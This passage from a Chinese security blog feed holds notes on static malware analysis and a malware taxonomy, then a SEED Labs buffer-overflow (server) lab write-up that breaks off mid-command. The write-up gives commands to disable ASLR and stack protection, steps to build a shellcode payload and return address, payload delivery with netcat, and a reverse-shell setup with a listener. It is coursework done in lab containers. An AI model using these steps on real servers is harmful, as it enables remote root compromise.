    <title>CH02-静态分析基础技术</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH02%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH02%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="反病毒引擎扫描">1. 反病毒引擎扫描</h1><ul><li>原理：依靠一个已知恶意代码可识别片段的特征数据库（病毒文件特征库），以及基于行为与模式匹配的分析（启发式检测），来识别可疑文件.</li><li>具体使用：<ul><li>使用反病毒软件进行检测</li><li>开源恶意代码扫描引擎ClamAV</li><li>从反病毒厂商获得已知恶意代码的分析报告和结果</li><li><ahref="https://www.virustotal.com/">VirusTotal</a>：允许上传一个文件，然后调用多个反病毒引擎来进行扫描</li></ul></li></ul><h1 id="哈希值">2. 哈希值</h1><ul><li>哈希是一种用来唯一标识恶意代码的常用方法</li><li>恶意代码样本通过一个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值（类似指纹）</li><li>常用哈希函数：MD5、SHA-1</li></ul><h1 id="查找字符串">3. 查找字符串</h1><ul><li>程序中的字符串就是一段可打印的字符序列，其中会包含很多信息，比如弹出的消息，读取的位置，链接的URL等。</li><li>存储方式：ASCLL、Unicode</li><li>两种类型格式都以NULL结束符，表示字符串是完整的。ASCII字符串每个字符使用一个字节，Unicode使用两个字节。</li><li>使用：strings -查找目标文件或二进制文件中的可显示字符串.注意：有些时候检测到的并非是真正的字符串，可能是内存地址，CPU指令序列.</li></ul><h1 id="加壳与混淆恶意代码">4. 加壳与混淆恶意代码</h1><ul><li>合法程序通常会包含很多字符串，而由被加壳或者混淆的恶意代码直接分析获得的可打印字符串则很少</li><li>加壳和混淆代码通常至少会包含LoadLibrary和GetProcAddress函数，它们是用来加载和使用其他函数功能的</li></ul><h2 id="文件加壳">4.1 文件加壳</h2><p>当加壳程序运行时，会首先运行一小段脱壳代码，来解压缩加壳的文件，然后再运行脱壳后的文件。左边文件是可执行程序源文件，右边是加壳后的可执行程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049831.png"alt="image-20231012102949934" /><figcaption aria-hidden="true">image-20231012102949934</figcaption></figure><h2 id="使用peid检测加壳">4.2 使用PEiD检测加壳</h2><p>检测加壳器的类型，或用来链接应用程序的编译器类型</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049832.png"alt="image-20231012103355802" /><figcaption aria-hidden="true">image-20231012103355802</figcaption></figure><h1 id="pe文件格式">5. PE文件格式</h1><ul><li>PE（PortableExecute）文件格式是windows可执行文件、对象代码和DLL所使用的标准格式，常见的有DLL，EXE，OCX，SYS等.</li><li>PE是指32位可执行文件，64位的可执行文件称为PE+或者PE32+，并非PE64.</li><li>PE文件以一个文件头开始，其中包含代码信息、应用程序类型、所需的库函数与空间要求.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049833.png"alt="image-20231012103534449" /><figcaption aria-hidden="true">image-20231012103534449</figcaption></figure><h1 id="链接库与函数">6. 链接库与函数</h1><ul><li><strong>导入函数</strong>也叫引入函数，引入函数被该模块调用，但它又不在该模块中，调用模块中只包含该函数的一些信息，比如函数名以及它所在的模块（链接库）名等信息.</li><li><strong>导入表</strong>，导入函数相关信息都保存在PE文件中的导入表中.要找到PE文件的导入表，必须先找到datadirectory，即数据目录.</li></ul><h2 id="静态链接运行时链接与动态链接">6.1静态链接、运行时链接与动态链接</h2><ul><li><strong>静态</strong>链接：在生成可执行程序时，就把库中的内容加入到程序中。在程序运行前，先将其目标模块及它们所需的库函数，链接成一个完整的装配模块，以后不再拆开的链接方式。</li><li><strong>动态</strong>链接：用户源程序编译后得到的一组目标模块，在装入内存时釆用边装入边链接的链接方式。装入一个目标模块时，若发生一个外部模块调用，将引起装入程序去找出相应的外部目标模块，并将它装入内存，还要修改目标模中的相对地址。</li><li><strong>运行时</strong>链接：有些目标模块的链接，推迟到执行时才进行。即在执行过程中，若发现一个被调用模块尚未装入内存时，由OS去找到该模块，将它装入内存，并把它连接到调用者模块上。对某些目标模块的链接，是在程序执行中需要该目标模块时，才对它进行的链接。</li></ul><h2 id="dependency-walker">6.2 Dependency Walker</h2><ul><li><p>该工具用于探索动态链接函数</p></li><li><p>常见DLL程序</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049834.png"alt="image-20231012104028617" /><figcaption aria-hidden="true">image-20231012104028617</figcaption></figure></li></ul><h2 id="导入函数">6.3 导入函数</h2><p>PE文件头包含可执行文件使用的特定函数相关信息。导入函数描述可执行文件会使用哪些WindowsAPI函数，也就是可能会有什么样的操作。</p><h2 id="导出函数">6.4 导出函数</h2><p>用来与其他程序和代码进行交互时所使用的。一个DLL会出现一个或多个功能函数，然后将其导出，供别的程序导入并使用。</p><h1 id="pe文件头与节">7. PE文件头与节</h1><h2 id="文件头">7.1 文件头</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310291021656.png"alt="image-20231012104534105" /><figcaption aria-hidden="true">image-20231012104534105</figcaption></figure><h2 id="分节">7.2 分节</h2><ul><li>.text：包含CPU执行指令。所有其他节存储数据和支持性的信息。一般来说，这是唯一可以执行的节，也应该是唯一包含代码的节。</li><li>.rdata：包含导入与导出函数信息，与DependencyWalker和PeView工具所获得的信息是相同的。还可以存储程序所使用的其他只读数据。有些文件包括.idata和.edata节来存储导入导出信息。</li><li>.data：包含程序的全局数据，可以从程序的任何地方访问到。本地数据并不存储在这个节中，而是在PE文件的某个其他位置上。</li><li>.rsrc：包含由可执行文件所使用的资源，不能执行，比如：图标、图片、菜单项、字符串等。字符串也可以存储在主程序中。存放在这是为提供多语种支持。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310121049835.png"alt="image-20231012104458546" /><figcaption aria-hidden="true">image-20231012104458546</figcaption></figure><h2 id="peview">7.3 PEview</h2><p>查看PE文件头部信息</p><p>参考教程：</p><p><ahref="https://zhuanlan.zhihu.com/p/24208568">常见恶意软件工具分析（一）- 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH01-恶意代码分析技术入门</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH01%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH01%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="恶意代码基础知识">1 恶意代码基础知识</h1><h2 id="定义">1.1 定义</h2><p>使计算机按照攻击者的意图运行以达到恶意目的的<strong>指令集合</strong>（二进制执行文件，脚本语言代码，宏代码，寄生在文件、启动扇区的指令流）</p><h2 id="分类">1.2 分类</h2><ul><li>计算机病毒(Virus)：<ul><li>定义特征：通过感染文件(可执行文件、数据文件、电子邮件等)或磁盘引导扇区进行传播，一般<strong>需要</strong>宿主程序被执行或人为交互才能运行。</li><li>典型实例：Brain，Concept，CIH，勒索软件</li></ul></li><li>蠕虫(Worm)：<ul><li>定义特征：一般为<strong>不需要</strong>宿主的单独文件，通过网络传播，自动复制，通常无需人为交互便可感染传播。</li><li>典型实例：Morris，CodeRed，Slammer</li></ul></li><li>启动器(Downloader)：<ul><li>定义特征：从远程主机下载到本地执行的轻量级恶意代码，不需要或仅需要极少的人为干预。代表性的开发工具有：JavaScript，VBScript，Java，以及ActiveX。启动其他恶意程序的恶意代码。</li><li>典型实例：SantyWorm等。</li></ul></li><li>后门(Backdoor)：<ul><li>定义特征：绕过正常的安全控制机制，从而为攻击者提供访问途径。</li><li>典型实例：Netcat，BO，冰河，Glupteba。</li></ul></li><li>特洛伊木马(Trojan)：<ul><li>定义特征：伪装成有用软件，隐藏其恶意目标，欺骗用户安装执行。</li><li>典型实例：Setiri，Emotet，Dridex，Ramnit</li></ul></li><li>僵尸程序(Bot)：<ul><li>定义特征：一般为<strong>不需要</strong>宿主的单独文件，通过网络传播，自动复制，通常无需人为交互便可感染传播；使用一对多的命令与控制机制组成僵尸网络。</li><li>典型实例：Sdbot，Agobot，Mirai，Glupteba</li></ul></li><li>内核套件(Rootkit)：<ul><li>定义特征：通过替换或修改系统关键可执行文件（用户态），或者通过控制操作系统内核(内核态)，用以获取并保持最高控制权(rootaccess)。</li><li>典型实例：LRK，FU，hdef</li></ul></li><li>融合型恶意代码及Bootkit：<ul><li>定义特征：融合上述多种恶意代码技术，构成更具破坏性的恶意代码形态，如Bootkit。</li><li>典型实例：Nimda、Stuxnet、Flame、Duqu</li></ul></li></ul><h1 id="恶意代码分析技术">2 恶意代码分析技术</h1><table><thead><tr class="header"><th><strong>区别项</strong></th><th><strong>恶意代码分析</strong></th><th><strong>良性代码分析</strong></th></tr></thead><tbody><tr class="odd"><td>目的公开性</td><td>目的未知，需分析和推测其目的</td><td>一般情况下，目的是公开且明确的，可辅助分析过程</td></tr><tr class="even"><td>目的恶意性</td><td>恶意目的，需要受控环境</td><td>良性，无需受控环境</td></tr><tr class="odd"><td>是否存在源码</td><td>绝大多数情况无源码，二进制分析</td><td>开源软件存在源码，源码分析；闭源软件则需二进制分析</td></tr><tr class="even"><td>使用对抗分析技术</td><td>各种多样化对抗分析，博弈问题</td><td>一般无对抗分析，商业软件也引入对抗分析保护产权</td></tr></tbody></table><ul><li><strong>静态</strong>分析<ul><li>通过反病毒引擎扫描识别已知的恶意代码家族和变种名</li><li>逆向分析恶意代码模块构成，内部数据结构，关键控制流程等，理解恶意代码的机理，并提取特征码用于检测。</li><li>分析方法：恶意代码扫描、文件格式识别、字符串提取、二进制结构分析、反汇编、反编译、代码结构与逻辑分析、加壳识别和代码脱壳</li></ul></li><li><strong>动态</strong>分析<ul><li>通过在受控环境中执行目标代码，以获取目标代码的行为及运行结果。</li><li>分析方法：快照比对、动态行为监控(APIHooking)、网络监控、沙盒(sandbox)、动态跟踪调试</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Buffer-Overflow Attack (Server Version)</title>
    <link href="/2023/10/11/SEED-LABS/Software%20Security/Buffer-Overflow%20Attack(Server%20Version)/"/>
    <url>/2023/10/11/SEED-LABS/Software%20Security/Buffer-Overflow%20Attack(Server%20Version)/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><p>缓冲区溢出是指程序试图写入超出缓冲区边界的数据。恶意用户可利用这一漏洞改变程序的流程控制，从而导致恶意代码的执行。本实验的目的是让学生从实践中了解这种类型的漏洞，并学习如何在攻击中利用这种漏洞。</p><p>在本实验中，学生将得到四台不同的服务器，每台服务器都运行着一个存在缓冲区溢出漏洞的程序。他们的任务是开发一个利用该漏洞的方案，并最终获得这些服务器的root权限。除攻击外，学生还将实验几种针对缓冲区溢出攻击的对策。学生需要评估这些方案是否有效，并解释原因。本实验室涵盖以下主题：</p><ul><li>缓冲区溢出漏洞和攻击</li><li>函数调用中的堆栈布局</li><li>地址随机化、不可执行堆栈和 StackGuard</li><li>Shellcode：我们有一个关于如何从头开始编写 shellcode的独立实验室</li></ul><h1 id="lab-environment-setup">2. Lab Environment Setup</h1><h2 id="turning-off-countermeasures">2.1 Turning offCountermeasures</h2><p>在开始本实验之前，我们需要确保地址随机化对策已关闭；否则，攻击将很困难。可以使用以下命令来关闭：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049695.png"alt="image-20231011094531325" /><figcaption aria-hidden="true">image-20231011094531325</figcaption></figure><h2 id="the-vulnerable-program">2.2 The Vulnerable Program</h2><p>本实验室使用的漏洞程序名为 stack.c，位于 server-code文件夹中。这个程序存在缓冲区溢出漏洞，而你的任务就是利用这个漏洞获得root权限。下面列出的代码删除了一些非必要信息，因此与你从实验室设置文件中获得的代码略有不同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121064.png"alt="image-20231207101146304" /><figcaption aria-hidden="true">image-20231207101146304</figcaption></figure><p>上述程序存在缓冲区溢出漏洞。它从标准输入端读取数据，然后将数据传递到函数bof() 中的另一个缓冲区。原始输入的最大长度为 517 字节，但 bof()中的缓冲区只有 BUF SIZE 字节长，小于 517 字节。由于 strcpy()不会检查边界，因此会发生缓冲区溢出。</p><p>程序将以 root权限在服务器上运行，其标准输入将重定向到服务器与远程用户之间的 TCP连接。因此，程序实际上是从远程用户获取数据。如果用户能利用这个缓冲区溢出漏洞，他们就能在服务器上获得root shell。</p><p><strong>编译</strong>：要编译上述易受攻击的程序，我们需要使用<code>-fno-stack-protector</code>和<code>-z execstack</code>选项关闭堆栈保护和不可执行堆栈保护。下面是编译命令的示例（L1环境变量设置了 stack.c 中 BUF SIZE 常量的值）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c<br></code></pre></td></tr></table></figure><p>我们将把堆栈程序编译成 32 位和 64 位二进制文件。我们预置的 Ubuntu20.04 虚拟机是 64 位虚拟机，但仍支持 32 位二进制文件。我们只需在 gcc命令中使用 -m32 选项即可。对于 32 位编译，我们还可以使用 -static来生成静态链接的二进制文件，它是独立的，不依赖于任何动态链接库，因为我们的容器中没有安装32 位动态链接库。</p><p>Makefile 中已经提供了编译命令。要编译代码，需要键入 make来执行这些命令。变量 L1、L2、L3 和 L4 已在 Makefile中设置；它们将在编译过程中使用。编译完成后，我们需要将二进制文件复制到bof-containers文件夹，以便容器可以使用它们。以下命令将执行编译和安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make<br>$ make install<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049696.png"alt="image-20231011094543773" /><figcaption aria-hidden="true">image-20231011094543773</figcaption></figure><p><strong>服务器程序</strong>：在 server-code文件夹中，你可以找到一个名为 server.c的程序，它是服务器的主要入口。它监听 9090 端口。当收到 TCP连接时，它会调用堆栈程序，并将 TCP连接设置为堆栈程序的标准输入。这样，当堆栈从 stdin中读取数据时，实际上是从 TCP 连接中读取的，即数据是由 TCP客户端的用户提供的。学生不必阅读 server.c 的源代码。</p><h2 id="container-setup-and-commands">2.3 Container Setup andCommands</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker-compose build <span class="hljs-comment"># Build the container image</span><br>$ docker-compose up <span class="hljs-comment"># Start the container</span><br>$ docker-compose down <span class="hljs-comment"># Shut down the container</span><br>// Aliases <span class="hljs-keyword">for</span> the Compose commands above<br>$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br><br>$ dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash<br>// The following example shows how to get a shell inside hostC<br>$ dockps<br>b1004832e275 hostA-10.9.0.5<br>0af4ea7a3e2e hostB-10.9.0.6<br>9652715c8e0a hostC-10.9.0.7<br>$ docksh 96<br>root@9652715c8e0a:/<span class="hljs-comment">#</span><br>// Note: If a docker <span class="hljs-built_in">command</span> requires a container ID, you <span class="hljs-keyword">do</span> not need to<br>// <span class="hljs-built_in">type</span> the entire ID string. Typing the first few characters will<br>// be sufficient, as long as they are unique among all the containers.<br></code></pre></td></tr></table></figure><h1 id="task-1-get-familiar-with-the-shellcode">3. Task 1: Get Familiarwith the Shellcode</h1><p>缓冲区溢出攻击的最终目的是在目标程序中注入恶意代码，以便利用目标程序的权限执行代码。大多数代码注入攻击都广泛使用Shellcode。让我们在本任务中熟悉一下它。</p><p>Shellcode 通常用于代码注入攻击。它基本上是一段启动 shell的代码，通常用汇编语言编写。在本实验室中，我们只提供普通 shellcode的二进制版本，而不解释其工作原理，因为它并不复杂。如果您对 shellcode的具体工作原理感兴趣，并想从头开始编写 shellcode，您可以从另一个名为"Shellcode Lab "的 SEED 实验室中学习。下面列出了我们的通用shellcode（我们只列出了 32 位版本）：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049700.png"alt="image-20231011095123331" /><figcaption aria-hidden="true">image-20231011095123331</figcaption></figure><p>shellcode 运行"/bin/bash "shell程序（第➊行），但它有两个参数："-c"（第➋行）和一个命令字符串（第➌行）。这表示shell 程序将运行第二个参数中的命令。这些字符串末尾的"*"只是一个占位符，在执行 shellcode 时将被一个 0x00字节替换。每个字符串的末尾都需要有一个 0，但我们不能在 shellcode 中输入0。相反，我们会在每个字符串的末尾添加一个占位符，然后在执行过程中动态地在占位符中添加一个零。</p><p>如果我们想让 shellcode运行其他命令，只需修改第➌行中的命令字符串即可。不过，在修改时，我们需要确保不要改变这个字符串的长度，因为argv[] 数组占位符的起始位置（紧跟在命令字符串之后）是硬编码在 shellcode的二进制部分中的。如果我们改变长度，就需要修改二进制部分。为了使字符串末尾的星号保持在同一位置，可以添加或删除空格。</p><p>您可以在 shellcode 文件夹中找到通用 shellcode。在里面，你会看到两个Python 程序：shellcode_32.py 和 shellcode_64.py。它们分别用于 32 位和 64位 shellcode。这两个 Python 程序将分别把二进制 shellcode写入codefile_32和codefile_64。然后，您可以使用call_shellcode来执行其中的shellcode。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121065.png"alt="image-20231207102205857" /><figcaption aria-hidden="true">image-20231207102205857</figcaption></figure><p>任务：请修改shellcode，以便用它来删除文件。请在实验报告中包含您修改过的 shellcode以及截图。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>以修改 64 位代码为例，首先将<code>shellcode_64.py</code>复制到<code>my_shellcode_64.py</code>，方便后续查看原文件</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049701.png"alt="image-20231011095221851" /><figcaption aria-hidden="true">image-20231011095221851</figcaption></figure></li><li><p>修改命令为删除文件，上图为原代码，下图为修改后代码</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049702.png"alt="image-20231011095247870" /><figcaption aria-hidden="true">image-20231011095247870</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049704.png"alt="image-20231011095252811" /><figcaption aria-hidden="true">image-20231011095252811</figcaption></figure></li><li><p>步骤 1：创建测试文件（删除使用）；步骤2：执行修改后的脚本文件，从而生成 <code>codefile_64</code>；步骤 3：编译<code>call_shellcode.c</code>；步骤 4：先执行<code>a64.out</code>，然后查看当前目录文件，经过比对，发现成功删除<code>testfile</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049705.png"alt="image-20231011095437510" /><figcaption aria-hidden="true">image-20231011095437510</figcaption></figure></li><li><p><strong>小结</strong>：在攻击中，shellcode是一段用于利用软件漏洞的有效负载，是 16进制的机器码，以其经常让攻击者获得shell 而得名。shellcode常常使用机器语言编写。 可在寄存器eip 溢出后，放入一段可让 CPU 执行的shellcode 机器码，让电脑可以执行攻击者的任意指令。</p></li></ol><h1 id="task-2-level-1-attack">4. Task 2: Level-1 Attack</h1><p>当我们使用附带的 docker-compose.yml文件启动容器时，将有四个容器在运行，分别代表四个难度级别。在本任务中，我们将处理第1 级。</p><h2 id="server">4.1 Server</h2><p>我们的第一个目标运行在 10.9.0.5 上（端口号为9090），易受攻击的程序栈是一个 32位程序。让我们先向该服务器发送一条良性信息。我们将看到目标容器打印出以下信息（您看到的实际信息可能有所不同）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121066.png"alt="image-20231207102944074" /><figcaption aria-hidden="true">image-20231207102944074</figcaption></figure><p>服务器最多会接受来自用户的 517 字节数据，这将导致缓冲区溢出。你的任务就是构建有效负载来利用这个漏洞。如果将有效载荷保存在文件中，就可以使用以下命令将有效载荷发送到服务器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> &lt;file&gt; | nc 10.9.0.5 9090<br></code></pre></td></tr></table></figure><p>如果服务器程序返回，则会打印出"正确返回"。如果没有打印出这条信息，堆栈程序可能已经崩溃。服务器仍将继续运行，接受新的连接。</p><p>在这项任务中，有两个对缓冲区溢出攻击至关重要的信息被打印出来，作为对学生的提示：帧指针的值和缓冲区的地址（以✰标记的行）。<strong>帧指针寄存器</strong>在x86 架构中称为 ebp，在 x64 架构中称为rbp。您可以使用这两个信息来构建有效载荷。</p><p><strong>增加随机性</strong>：我们在程序中添加了一点随机性，因此不同的学生可能会看到不同的缓冲区地址和帧指针值。只有当容器重新启动时，这些值才会发生变化，因此只要保持容器运行，就会看到相同的数字（不同学生看到的数字仍然不同）。这种随机性与地址随机化对策不同。它的唯一目的是让学生的作业有点不同。</p><h2 id="writing-exploit-code-and-launching-attack">4.2 Writing ExploitCode and Launching Attack</h2><p>要利用目标程序中的缓冲区溢出漏洞，我们需要准备一个有效载荷，并将其保存在一个文件中（本文将使用badfile 作为文件名）。为此，我们将使用 Python 程序。我们提供了一个名为exploit.py的骨架程序，它包含在实验室设置文件中。代码不完整，学生需要替换代码中的一些重要值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121067.png"alt="image-20231207103319974" /><figcaption aria-hidden="true">image-20231207103319974</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121068.png"alt="image-20231207103329024" /><figcaption aria-hidden="true">image-20231207103329024</figcaption></figure><p>完成上述程序后，运行它。这将生成 badfile的内容。然后将其发送到易受攻击的服务器。如果你的漏洞利用程序执行得当，你放在shellcode中的命令就会被执行。如果您的命令生成了一些输出，您应该可以在容器窗口中看到它们。请提供证据，证明您可以成功地让有漏洞的服务器运行您的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$./exploit.py // create the badfile<br>$ <span class="hljs-built_in">cat</span> badfile | nc 10.9.0.5 9090<br></code></pre></td></tr></table></figure><p><strong>反向shell</strong>：我们对运行一些预先确定的命令不感兴趣。我们希望在目标服务器上获得一个rootshell，这样我们就可以输入任何想要的命令。由于我们在远程机器上，如果只是让服务器运行/bin/sh，我们就无法控制 shell 程序。反向 shell是解决这一问题的典型技术。请修改 shellcode中的命令字符串，以便在目标服务器上运行反向shell。请在实验报告中附上截图和说明。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>原理：<strong>栈底为高地址，栈顶为低地址，栈由高地址向低地址增长。</strong>栈帧储存的是一个函数在栈中的信息，一般来说相邻的栈帧的关系是父函数与子函数之间的关系，子函数的栈底指针会保存父函数栈底指针的地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049706.png"alt="image-20231011100137705" /><figcaption aria-hidden="true">image-20231011100137705</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310240940419.png"alt="image-20231024093950979" /><figcaption aria-hidden="true">image-20231024093950979</figcaption></figure></li><li><p>向目标服务器 10.9.0.5发送消息，然后观察服务器端打印出的信息，得到帧指针（ebp）：<code>0xffffd608</code>和 buffer地址：<code>0xffffd598</code>。重复两次，发现得到地址未发生变化，说明地址随机化已关闭。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049708.png"alt="image-20231011100354334" /><figcaption aria-hidden="true">image-20231011100354334</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049709.png"alt="image-20231011100401123" /><figcaption aria-hidden="true">image-20231011100401123</figcaption></figure></li><li><p>修改 exploit.py，具体如下：</p><ul><li><p>根据提供的 shellcode.txt 修改 shellcode</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049710.png"alt="image-20231011100544158" /><figcaption aria-hidden="true">image-20231011100544158</figcaption></figure></li><li><p>代码解释：填充若干长度的0x90，这个机器码对应的指令是NOP，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP的填充，只要返回地址能够命中临近shellcode任意位置，最后都可以跳转到shellcode 的起始处。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049711.png"alt="image-20231011100622963" /><figcaption aria-hidden="true">image-20231011100622963</figcaption></figure></li><li><p>构建有效载荷，设置 start= 517-len(shellcode)，517 为content大小，该操作目的是将 content 结尾部分内容替换为攻击代码 shellcode。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049712.png"alt="image-20231011100730129" /><figcaption aria-hidden="true">image-20231011100730129</figcaption></figure></li><li><p>设置 ret=ebp(0xffffd608)+n(n&gt;=8),ebp即为第二步中得到的地址，因为关闭了地址随机化，所以每次值都一样。n&gt;=8原因：32 位下，前一个栈帧和返回内容各占 4 字节，使用当前栈帧加上大于 8的数，即可跳到 shellcode 前的覆盖区（填充了 NOP指令），之后代码可以逐步运行到 shellcode 的起始处。注意：n值不能过大，过大可能无法命中覆盖区，此处以n=8 为例。Offset 为偏移值=ebp地址(0xffffd608)- 缓冲区地址(0xffffd598)+4=116，用来指示 ret地址，从而用新 ret进行覆盖。注意：offset 为 10 进制数。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049713.png"alt="image-20231011100919148" /><figcaption aria-hidden="true">image-20231011100919148</figcaption></figure></li></ul></li><li><p>生成 badfile，发送给服务器</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049714.png"alt="image-20231011100945179" /><figcaption aria-hidden="true">image-20231011100945179</figcaption></figure></li><li><p>观察到 shellcode 中代码成功执行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049715.png"alt="image-20231011101010254" /><figcaption aria-hidden="true">image-20231011101010254</figcaption></figure></li><li><p>reverse shell</p><ul><li><p>修改 exploit.py 中shellcode，需要先注释掉之前的命令。新命令含义：在服务器机器上启动一个bash shell，其输入来自 TCP 连接，输出也重定向到 TCP连接，此处为10.9.0.1:7070。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049716.png"alt="image-20231011101057494" /><figcaption aria-hidden="true">image-20231011101057494</figcaption></figure></li><li><p>重新生成 badfile</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049717.png"alt="image-20231011101112647" /><figcaption aria-hidden="true">image-20231011101112647</figcaption></figure></li><li><p>在本机开启监听端口，对应 shellcode 中的 7070 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnv 7070<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049718.png"alt="image-20231011101141673" /><figcaption aria-hidden="true">image-20231011101141673</figcaption></figure></li><li><p>将 badfile 发送给服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> badfile | nc 10.9.0.5 